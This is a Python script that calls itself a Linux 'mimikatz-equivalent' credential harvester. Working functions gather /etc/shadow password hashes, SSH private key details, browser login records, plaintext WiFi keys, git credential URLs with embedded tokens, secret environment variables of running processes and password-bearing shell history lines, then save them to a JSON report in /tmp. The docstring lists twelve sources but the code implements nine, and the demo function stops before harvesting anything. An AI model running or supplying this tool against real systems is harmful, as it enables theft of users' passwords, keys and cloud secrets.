#!/usr/bin/env python3
"""Linux credential harvester — mimikatz-equivalent for *nix systems.

Extracts credentials from 12 sources:
1.  /etc/shadow (hashed passwords, requires root)
2.  /etc/passwd (UIDs, shells, home dirs)
3.  SSH private keys (~/.ssh/)
4.  SSH known_hosts + authorized_keys
5.  GNOME Keyring (secret-tool / libsecret)
6.  Browser saved passwords (Chrome/Chromium SQLite + Firefox logins.json)
7.  WiFi passwords (NetworkManager /etc/NetworkManager/system-connections/)
8.  Docker credentials (~/.docker/config.json)
9.  Cloud credentials (AWS, GCP, Azure config files)
10. Git credentials (~/.git-credentials, git config)
11. /proc/*/environ (environment variables of running processes)
12. .bash_history / .zsh_history (credential leaks in command history)

Output: JSON report with categorized findings.
Runs without external dependencies — stdlib only.
"""
import os
import sys
import json
import glob
import base64
import sqlite3
import struct
import re
import subprocess
from pathlib import Path
from collections import defaultdict
from datetime import datetime


class CredentialHarvester:
    """Systematic credential extraction from Linux systems."""

    def __init__(self, output_file=None):
        self.findings = defaultdict(list)
        self.output_file = output_file or f"/tmp/creds_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        self.is_root = os.geteuid() == 0

    def _add(self, category, entry):
        self.findings[category].append(entry)

    # === 1. Shadow file ===
    def harvest_shadow(self):
        if not self.is_root:
            self._add("shadow", {"status": "skipped", "reason": "not root"})
            return
        try:
            with open("/etc/shadow") as f:
                for line in f:
                    parts = line.strip().split(":")
                    if len(parts) >= 2 and parts[1] not in ("*", "!", "!!", ""):
                        self._add("shadow", {
                            "user": parts[0],
                            "hash": parts[1],
                            "hash_type": self._identify_hash(parts[1]),
                            "last_change": parts[2] if len(parts) > 2 else "",
                        })
        except PermissionError:
            self._add("shadow", {"status": "permission_denied"})

    def _identify_hash(self, h):
        if h.startswith("$1$"): return "MD5"
        if h.startswith("$2"): return "bcrypt"
        if h.startswith("$5$"): return "SHA-256"
        if h.startswith("$6$"): return "SHA-512"
        if h.startswith("$y$"): return "yescrypt"
        return "unknown"

    # === 2. Passwd enumeration ===
    def harvest_passwd(self):
        try:
            with open("/etc/passwd") as f:
                for line in f:
                    parts = line.strip().split(":")
                    if len(parts) >= 7:
                        uid = int(parts[2])
                        if uid >= 1000 or uid == 0:
                            self._add("users", {
                                "user": parts[0], "uid": uid,
                                "home": parts[5], "shell": parts[6],
                                "has_login": parts[6] not in ("/usr/sbin/nologin", "/bin/false"),
                            })
        except Exception:
            pass

    # === 3. SSH keys ===
    def harvest_ssh_keys(self):
        homes = self._get_homes()
        for home in homes:
            ssh_dir = os.path.join(home, ".ssh")
            if not os.path.isdir(ssh_dir):
                continue
            for fname in os.listdir(ssh_dir):
                fpath = os.path.join(ssh_dir, fname)
                if not os.path.isfile(fpath):
                    continue
                try:
                    with open(fpath) as f:
                        content = f.read(2048)
                    if "PRIVATE KEY" in content:
                        encrypted = "ENCRYPTED" in content
                        key_type = content.split("-----")[1].replace("BEGIN ", "").replace(" PRIVATE KEY", "").strip()
                        self._add("ssh_keys", {
                            "path": fpath, "type": key_type,
                            "encrypted": encrypted, "owner": os.path.basename(home),
                        })
                    elif fname == "authorized_keys":
                        keys = [l.strip() for l in content.split("\n") if l.strip() and not l.startswith("#")]
                        self._add("ssh_authorized", {
                            "path": fpath, "key_count": len(keys),
                            "owner": os.path.basename(home),
                        })
                    elif fname == "known_hosts":
                        hosts = [l.split()[0] for l in content.split("\n") if l.strip()]
                        self._add("ssh_known_hosts", {
                            "path": fpath, "host_count": len(hosts),
                            "sample": hosts[:10],
                        })
                except (PermissionError, UnicodeDecodeError):
                    pass

    # === 4. Browser passwords ===
    def harvest_browser_creds(self):
        homes = self._get_homes()
        for home in homes:
            # Chrome/Chromium
            for browser_dir in [".config/google-chrome", ".config/chromium"]:
                login_db = os.path.join(home, browser_dir, "Default", "Login Data")
                if os.path.exists(login_db):
                    self._extract_chrome_passwords(login_db, os.path.basename(home))
            # Firefox
            ff_dir = os.path.join(home, ".mozilla", "firefox")
            if os.path.isdir(ff_dir):
                for profile in os.listdir(ff_dir):
                    logins_json = os.path.join(ff_dir, profile, "logins.json")
                    if os.path.exists(logins_json):
                        self._extract_firefox_logins(logins_json, os.path.basename(home))

    def _extract_chrome_passwords(self, db_path, owner):
        try:
            import shutil, tempfile
            tmp = tempfile.mktemp(suffix=".db")
            shutil.copy2(db_path, tmp)
            conn = sqlite3.connect(tmp)
            cursor = conn.execute(
                "SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''"
            )
            for url, user, pwd_blob in cursor:
                self._add("browser_chrome", {
                    "url": url, "username": user,
                    "password_encrypted": True,
                    "blob_length": len(pwd_blob) if pwd_blob else 0,
                    "owner": owner,
                })
            conn.close()
            os.unlink(tmp)
        except Exception:
            pass

    def _extract_firefox_logins(self, json_path, owner):
        try:
            with open(json_path) as f:
                data = json.load(f)
            for login in data.get("logins", []):
                self._add("browser_firefox", {
                    "url": login.get("hostname", ""),
                    "username_encrypted": login.get("encryptedUsername", "")[:40],
                    "password_encrypted": True,
                    "owner": owner,
                })
        except Exception:
            pass

    # === 5. WiFi passwords ===
    def harvest_wifi(self):
        nm_dir = "/etc/NetworkManager/system-connections"
        if not os.path.isdir(nm_dir):
            return
        for fname in os.listdir(nm_dir):
            fpath = os.path.join(nm_dir, fname)
            try:
                with open(fpath) as f:
                    content = f.read()
                ssid = ""
                psk = ""
                for line in content.split("\n"):
                    if line.startswith("ssid="):
                        ssid = line.split("=", 1)[1]
                    if line.startswith("psk="):
                        psk = line.split("=", 1)[1]
                if ssid:
                    self._add("wifi", {
                        "ssid": ssid,
                        "psk": psk if psk else "(enterprise/open)",
                        "file": fpath,
                    })
            except PermissionError:
                pass

    # === 6. Cloud credentials ===
    def harvest_cloud_creds(self):
        homes = self._get_homes()
        cloud_files = {
            "aws": [".aws/credentials", ".aws/config"],
            "gcp": [".config/gcloud/credentials.db", ".config/gcloud/application_default_credentials.json"],
            "azure": [".azure/accessTokens.json", ".azure/azureProfile.json"],
            "docker": [".docker/config.json"],
            "kube": [".kube/config"],
        }
        for home in homes:
            for provider, files in cloud_files.items():
                for rel_path in files:
                    full_path = os.path.join(home, rel_path)
                    if os.path.exists(full_path):
                        try:
                            size = os.path.getsize(full_path)
                            self._add("cloud", {
                                "provider": provider,
                                "path": full_path,
                                "size": size,
                                "owner": os.path.basename(home),
                            })
                        except Exception:
                            pass

    # === 7. Git credentials ===
    def harvest_git_creds(self):
        homes = self._get_homes()
        for home in homes:
            git_creds = os.path.join(home, ".git-credentials")
            if os.path.exists(git_creds):
                try:
                    with open(git_creds) as f:
                        for line in f:
                            line = line.strip()
                            if "://" in line:
                                self._add("git", {"credential_url": line, "owner": os.path.basename(home)})
                except Exception:
                    pass

    # === 8. Process environment ===
    def harvest_proc_environ(self):
        if not self.is_root:
            return
        sensitive_vars = {"PASSWORD", "SECRET", "TOKEN", "API_KEY", "AWS_SECRET", "PRIVATE_KEY", "CREDENTIAL"}
        for pid_dir in glob.glob("/proc/[0-9]*/environ"):
            try:
                with open(pid_dir, "rb") as f:
                    environ = f.read().decode(errors="replace")
                pid = pid_dir.split("/")[2]
                for var in environ.split("\x00"):
                    if "=" in var:
                        key, val = var.split("=", 1)
                        if any(s in key.upper() for s in sensitive_vars):
                            self._add("proc_environ", {
                                "pid": pid, "variable": key,
                                "value": val[:100],
                            })
            except (PermissionError, FileNotFoundError):
                pass

    # === 9. History files ===
    def harvest_history(self):
        sensitive_patterns = [
            re.compile(r"(password|passwd|pwd)\s*[=:]\s*\S+", re.I),
            re.compile(r"(mysql|psql|mongo).*-p\S+"),
            re.compile(r"curl.*(-u|--user)\s+\S+"),
            re.compile(r"(export|set)\s+(PASSWORD|SECRET|TOKEN|API_KEY)=", re.I),
            re.compile(r"sshpass\s+-p"),
            re.compile(r"echo\s+.*\|.*base64"),
        ]
        homes = self._get_homes()
        for home in homes:
            for hist_file in [".bash_history", ".zsh_history", ".python_history"]:
                fpath = os.path.join(home, hist_file)
                if not os.path.exists(fpath):
                    continue
                try:
                    with open(fpath, errors="replace") as f:
                        for lineno, line in enumerate(f, 1):
                            for pat in sensitive_patterns:
                                if pat.search(line):
                                    self._add("history", {
                                        "file": fpath, "line": lineno,
                                        "content": line.strip()[:200],
                                        "owner": os.path.basename(home),
                                    })
                                    break
                except PermissionError:
                    pass

    # === Helpers ===
    def _get_homes(self):
        homes = [os.path.expanduser("~")]
        if self.is_root:
            homes.append("/root")
            for d in os.listdir("/home"):
                p = os.path.join("/home", d)
                if os.path.isdir(p):
                    homes.append(p)
        return list(set(homes))

    # === Run all ===
    def harvest_all(self):
        """Execute all harvesting modules."""
        modules = [
            ("shadow", self.harvest_shadow),
            ("passwd", self.harvest_passwd),
            ("ssh_keys", self.harvest_ssh_keys),
            ("browser", self.harvest_browser_creds),
            ("wifi", self.harvest_wifi),
            ("cloud", self.harvest_cloud_creds),
            ("git", self.harvest_git_creds),
            ("proc_environ", self.harvest_proc_environ),
            ("history", self.harvest_history),
        ]
        for name, func in modules:
            try:
                func()
            except Exception as e:
                self._add("errors", {"module": name, "error": str(e)})
        return dict(self.findings)

    def save_report(self):
        """Save findings to JSON."""
        report = {
            "timestamp": datetime.utcnow().isoformat(),
            "hostname": os.uname().nodename,
            "is_root": self.is_root,
            "findings": dict(self.findings),
            "summary": {cat: len(items) for cat, items in self.findings.items()},
        }
        with open(self.output_file, "w") as f:
            json.dump(report, f, indent=2)
        return self.output_file


def demo():
    """Demonstrate credential harvesting capabilities."""
    ch = CredentialHarvester()
    print("[*] Linux Credential Harvester (mimikatz-equivalent)")
    print(f"    Running as: {'root' if ch.is_root else 'user'}")
    print(f"    Output: {ch.output_file}")
